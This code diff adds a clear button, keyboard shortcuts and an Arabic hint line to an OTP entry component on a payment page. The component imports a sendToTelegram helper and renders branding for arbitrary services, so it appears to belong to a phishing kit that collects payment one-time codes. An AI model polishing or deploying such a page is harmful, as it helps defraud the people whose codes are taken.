@@ -4,7 +4,7 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
-import { Shield, AlertCircle, Check, ArrowLeft } from "lucide-react";
+import { Shield, AlertCircle, Check, ArrowLeft, X } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { useLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
@@ -40,6 +40,24 @@ const PaymentOTPForm = () => {
     }
   }, [countdown]);
   
+  const handleClearOTP = () => {
+    setOtp("");
+    setError("");
+  };
+
+  // Handle keyboard shortcuts
+  const handleKeyDown = (e: React.KeyboardEvent) => {
+    // Clear OTP on Escape key
+    if (e.key === 'Escape') {
+      handleClearOTP();
+    }
+    // Clear OTP on Ctrl+Backspace or Cmd+Backspace
+    if ((e.ctrlKey || e.metaKey) && e.key === 'Backspace') {
+      e.preventDefault();
+      handleClearOTP();
+    }
+  };
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setError("");
@@ -117,14 +135,15 @@ const PaymentOTPForm = () => {
   };
   
   return (
-    <DynamicPaymentLayout
-      serviceName={serviceName}
-      serviceKey={serviceKey}
-      amount={formattedAmount}
-      title="رمز التحقق"
-      description={`أدخل رمز التحقق لخدمة ${serviceName}`}
-      icon={<Shield className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
-    >
+    <div onKeyDown={handleKeyDown} tabIndex={0}>
+      <DynamicPaymentLayout
+        serviceName={serviceName}
+        serviceKey={serviceKey}
+        amount={formattedAmount}
+        title="رمز التحقق"
+        description={`أدخل رمز التحقق لخدمة ${serviceName}`}
+        icon={<Shield className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
+      >
       {/* Title Section */}
       <div className="text-center mb-6 sm:mb-8">
         <div 
@@ -155,7 +174,7 @@ const PaymentOTPForm = () => {
       <form onSubmit={handleSubmit}>
         {/* OTP Input - 6 digits */}
         <div className="mb-6">
-          <div className="flex gap-2 justify-center" dir="ltr">
+          <div className="flex gap-2 justify-center items-center" dir="ltr">
             {[0, 1, 2, 3, 4, 5].map((index) => (
               <Input
                 key={index}
@@ -189,7 +208,29 @@ const PaymentOTPForm = () => {
                 required
               />
             ))}
+            
+            {/* Delete Button */}
+            {otp.length > 0 && attempts < 3 && (
+              <Button
+                type="button"
+                variant="ghost"
+                size="sm"
+                onClick={handleClearOTP}
+                className="w-8 h-8 sm:w-10 sm:h-10 p-0 rounded-full hover:bg-destructive/10 hover:text-destructive transition-colors mr-2"
+              >
+                <X className="w-4 h-4 sm:w-5 sm:h-5" />
+              </Button>
+            )}
           </div>
+          
+          {/* Keyboard Instructions */}
+          {otp.length > 0 && attempts < 3 && (
+            <div className="text-center mt-3">
+              <p className="text-xs text-muted-foreground">
+                اضغط <kbd className="px-1.5 py-0.5 text-xs bg-muted rounded">Esc</kbd> أو <kbd className="px-1.5 py-0.5 text-xs bg-muted rounded">Ctrl+Backspace</kbd> أو زر <X className="w-3 h-3 inline mx-1" /> لمسح الرمز
+              </p>
+            </div>
+          )}
         </div>
       
         {/* Error Message */}
@@ -273,7 +314,8 @@ const PaymentOTPForm = () => {
         <input type="text" name="otp" />
         <input type="text" name="timestamp" />
       </form>
-    </DynamicPaymentLayout>
+      </DynamicPaymentLayout>
+    </div>
   );
 };
 
